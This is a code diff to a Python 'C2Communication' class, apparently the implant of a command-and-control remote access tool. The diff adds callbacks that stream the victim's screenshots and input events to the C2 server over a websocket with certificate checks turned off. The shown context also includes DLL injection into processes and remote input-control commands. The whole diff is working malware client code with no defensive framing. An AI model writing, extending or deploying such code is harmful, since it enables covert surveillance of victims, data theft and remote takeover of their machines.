@@ -30,6 +30,10 @@ class C2Communication:
         self.registry_manager = RegistryManager()
         self.running = True
         
+        # Set up callbacks for remote control
+        self.remote_control.on_screen_capture = self._send_screenshot
+        self.remote_control.on_input_event = self._send_input_event
+        
     def _derive_session_key(self) -> bytes:
         """Derive session key from PSK"""
         kdf = PBKDF2HMAC(
@@ -62,7 +66,7 @@ class C2Communication:
                 ssl_context.verify_mode = ssl.CERT_NONE
                 
                 self.websocket = await websockets.connect(
-                    f"{self.server_url}/c2",
+                    self.server_url,
                     ssl=ssl_context,
                     ping_interval=20,
                     ping_timeout=60,
@@ -164,6 +168,29 @@ class C2Communication:
         if self.remote_control:
             self.remote_control.stop_screen_capture()
             self.remote_control.stop_input_control()
+    
+    def _send_screenshot(self, image_data):
+        """Send screenshot to C2 server"""
+        if self.websocket and hasattr(self.websocket, 'open') and self.websocket.open:
+            import asyncio
+            asyncio.create_task(self.websocket.send(json.dumps({
+                'type': 'screenshot',
+                'client_id': self.client_id,
+                'data': {
+                    'image_data': image_data,
+                    'format': 'jpeg'
+                }
+            })))
+    
+    def _send_input_event(self, event_data):
+        """Send input event to C2 server"""
+        if self.websocket and hasattr(self.websocket, 'open') and self.websocket.open:
+            import asyncio
+            asyncio.create_task(self.websocket.send(json.dumps({
+                'type': 'input_event',
+                'client_id': self.client_id,
+                'data': event_data
+            })))
 
     def _handle_command(self, command: Dict[str, Any]) -> Dict[str, Any]:
         """Handle command from C2 server"""
@@ -217,16 +244,16 @@ class C2Communication:
             elif cmd_type == 'screenshot':
                 # Capture screen
                 try:
-                    self.remote_control.start_screen_capture()
-                    time.sleep(0.1)  # Wait for capture
+                    print("[C2Communication] Received screenshot command")
+                    request_id = command.get('request_id', None)
+                    print(f"[C2Communication] Screenshot request_id: {request_id}")
                     
-                    # Get screenshot data from remote control module
+                    # Get screenshot data directly - no need to start/stop service
+                    # This will trigger the callback which will send the data
                     img_data = self.remote_control.capture_screenshot()
                     
-                    self.remote_control.stop_screen_capture()
-                    
                     if img_data:
-                        return {
+                        response = {
                             'type': 'screenshot', 
                             'data': {
                                 'status': 'success',
@@ -234,8 +261,19 @@ class C2Communication:
                                 'format': 'jpeg'
                             }
                         }
+                        
+                        # If this command had a request_id (HTTP fallback), include it in response
+                        if request_id:
+                            response['request_id'] = request_id
+                            print(f"[C2Communication] Attaching request_id {request_id} to screenshot response")
+                            
+                        return response
+                    
                     return {'type': 'error', 'data': {'message': 'Failed to capture screenshot'}}
                 except Exception as e:
+                    import traceback
+                    print(f"[C2Communication] Screenshot error: {str(e)}")
+                    traceback.print_exc()
                     return {'type': 'error', 'data': {'message': str(e)}}
                 
             elif cmd_type == 'process':
@@ -272,6 +310,18 @@ class C2Communication:
                     success = self.process_manager.inject_dll(pid, dll_path)
                     return {'type': 'process_inject', 'data': {'success': success}}
                     
+            elif cmd_type == 'set_scale_factor':
+                # Set scale factor for remote control
+                factor = float(command.get('scale_factor', 0.5))
+                self.remote_control.scale_factor = factor
+                return {
+                    'type': 'control_status',
+                    'data': {
+                        'status': 'scale_factor_set',
+                        'scale_factor': factor
+                    }
+                }
+                
             elif cmd_type == 'enable_remote_control':
                 # Enable remote control
                 success = self.remote_control.start_input_control()
